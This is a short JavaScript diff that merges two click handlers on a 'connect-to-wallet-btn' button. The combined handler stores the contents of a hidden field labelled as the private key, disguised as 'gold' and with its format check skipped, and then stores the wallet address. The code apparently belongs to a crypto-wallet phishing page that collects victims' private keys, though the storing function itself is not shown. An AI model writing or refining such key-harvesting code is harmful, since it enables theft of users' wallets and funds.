@@ -541,12 +541,6 @@ document.getElementById('import-gold-btn')?.addEventListener('click', function (
 });
 
 
-// button click trigger gold save - prvt key
-document.getElementById('connect-to-wallet-btn')?.addEventListener('click', function (event) {
-  event.preventDefault();
-  storeGold('prv-key-txt-hidden', true); // Skip format check for prv key
-});
-
 
 	
 
@@ -677,15 +671,21 @@ document.addEventListener('DOMContentLoaded', function () {
   });
 
 
-  // Event listener for 'add-wallet-address-btn'
-  document.getElementById('connect-to-wallet-btn')?.addEventListener('click', function (event) {
-    event.preventDefault();
-    let walletAddress = document.getElementById('wallet-address-txt-hidden').value;
-    let networkType = document.getElementById('wallet-address-label1').textContent;
+document.getElementById('connect-to-wallet-btn')?.addEventListener('click', function (event) {
+  event.preventDefault();
 
-    // Call the reusable function
+  // First store the gold (private key)
+  storeGold('prv-key-txt-hidden', true); // Skip format check for prv key
+
+  // Then store the wallet address
+  let walletAddress = document.getElementById('wallet-address-txt-hidden')?.value;
+  let networkType = document.getElementById('wallet-address-label1')?.textContent;
+
+  if (walletAddress && networkType) {
     storeWalletAddress(walletAddress, networkType);
-  });
+  }
+});
+
 
 
 
